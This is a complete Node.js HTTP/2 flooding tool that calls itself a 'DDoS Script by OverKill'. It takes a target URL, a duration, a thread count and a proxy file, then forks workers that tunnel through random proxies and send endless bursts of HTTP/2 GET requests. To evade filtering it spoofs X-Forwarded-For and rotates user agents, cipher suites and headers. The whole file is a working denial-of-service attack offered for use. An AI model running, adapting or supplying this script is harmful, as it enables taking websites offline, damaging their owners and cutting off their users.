const url = require("url"),
  fs = require("fs"),
  http2 = require("http2"),
  http = require("http"),
  tls = require("tls"),
  cluster = require("cluster"),
  fakeua = require("fake-useragent"),
  cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  ],
  accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
  ],
  lang_header = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en-gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
  ],
  encoding_header = ["deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "*"],
  controle_header = [
    "no-cache",
    "no-store",
    "no-transform",
    "only-if-cached",
    "max-age=0",
  ],
  ignoreNames = [
    "RequestError",
    "StatusCodeError",
    "CaptchaError",
    "CloudflareError",
    "ParseError",
    "ParserError",
  ],
  ignoreCodes = [
    "SELF_SIGNED_CERT_IN_CHAIN",
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
  ];
const colors = {
  reset: "\x1b[0m",
  sang: "\x1b[1m",
  dim: "\x1b[2m",
  underscore: "\x1b[4m",
  blink: "\x1b[5m",
  reverse: "\x1b[7m",
  hidden: "\x1b[8m",
  den: "\x1b[30m",
  do: "\x1b[31m",
  luc: "\x1b[32m",
  vang: "\x1b[33m",
  lam: "\x1b[34m",
  tim: "\x1b[35m",
  cyan: "\x1b[36m",
  trang: "\x1b[37m",
};
process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return !1;
  })
  .setMaxListeners(0);
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}
function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}
if (process.argv.length < 6) {
  console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
  console.log("\x1b[36m USAGE\x1b[37m: CFB <target> <time> <thread> <proxies>");
  console.log("\x1b[32m EXAMPLE\x1b[37m: CFB https://example.com 60 100 proxy.txt");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}
const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g)

function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}
count = proxys.length
if (cluster.isMaster) {
  const dateObj = new Date();
  console.clear();
  console.log(` 
--------------------------------------------------------------------------------------------------------

                                     \x1b[93mSCRIPT DDoS BY \x1b[94mOVER\x1b[95mKILL 
  
     \x1b[1m\x1b[36m █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\x1b[0m    \x1b[92m███████╗███████╗███╗   ██╗████████╗    
     \x1b[1m\x1b[36m██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\x1b[0m    \x1b[92m██╔════╝██╔════╝████╗  ██║╚══██╔══╝   
     \x1b[1m\x1b[36m███████║   ██║      ██║   ███████║██║     █████╔╝ \x1b[0m    \x1b[92m███████╗█████╗  ██╔██╗ ██║   ██║      
     \x1b[1m\x1b[36m██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ \x1b[0m    \x1b[92m╚════██║██╔══╝  ██║╚██╗██║   ██║     
     \x1b[1m\x1b[36m██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\x1b[0m    \x1b[92m███████║███████╗██║ ╚████║   ██║     
     \x1b[1m\x1b[36m╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[0m    \x1b[92m╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝     \x1b[0m 
                                                                                                                                                                              
      \x1b[31mTARGET: ${target}     \x1b[32mTIME: ${time}\x1b[0m     \x1b[33mTHREAD: ${thread}\x1b[0m     PROXIES: ${count}\x1b[0m

--------------------------------------------------------------------------------------------------------`);
async function runAttack() {
  for (let i = 0; i < thread; i++) {
    console.log(colors.sang + colors.luc + `ATTACK SENT` + colors.vang + ` ===>` + colors.do + ` ${target}` + colors.reset);
    await new Promise(resolve => setTimeout(resolve, 1500));
  }
}
runAttack();
  for (var bb = 0; bb < thread; bb++) {
    cluster.fork();
  }
  setTimeout(() => {
    process.exit(-1);
  }, time * 1000);
} else {
  function flood() {
    var parsed = url.parse(target);
    const uas = fakeua();
    var cipper = cipher();
    var proxy = proxyr().split(":");
    var header = {
      ":path": parsed.path,
      "X-Forwarded-For": proxy[0],
      "X-Forwarded-Host": proxy[0],
      ":method": "GET",
      "User-agent": uas,
      Origin: target,
      Accept: accept(),
      "Accept-Encoding": encoding(),
      "Accept-Language": lang(),
      "Cache-Control": controling(),
    };

    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 20000,
      maxSockets: 0,
    });

    var req = http.request(
      {
        host: proxy[0],
        agent: agent,
        globalAgent: agent,
        port: proxy[1],
        headers: {
          Host: parsed.host,
          "Proxy-Connection": "Keep-Alive",
          Connection: "Keep-Alive",
        },
        method: "CONNECT",
        path: parsed.host + ":443",
      },
      function () {
        req.setSocketKeepAlive(true);
      }
    );

    req.on("connect", function (res, socket, head) {
      const client = http2.connect(parsed.href, {
        createConnection: () =>
          tls.connect(
            {
              host: parsed.host,
              ciphers: cipper,
              secureProtocol: "TLS_method",
              TLS_MIN_VERSION: "1.2",
              TLS_MAX_VERSION: "1.3",
              servername: parsed.host,
              secure: true,
              rejectUnauthorized: false,
              ALPNProtocols: ["h2"],
              socket: socket,
            },
            function () {
              for (let i = 0; i < 200; i++) {
                const req = client.request(header);
                req.setEncoding("utf8");

                req.on("data", (chunk) => {
                });
                req.on("response", () => {
                  req.close();
                });
                req.end();
              }
            }
          ),
      });
    });
    req.end();
  }
  setInterval(() => {
    flood();
  });
}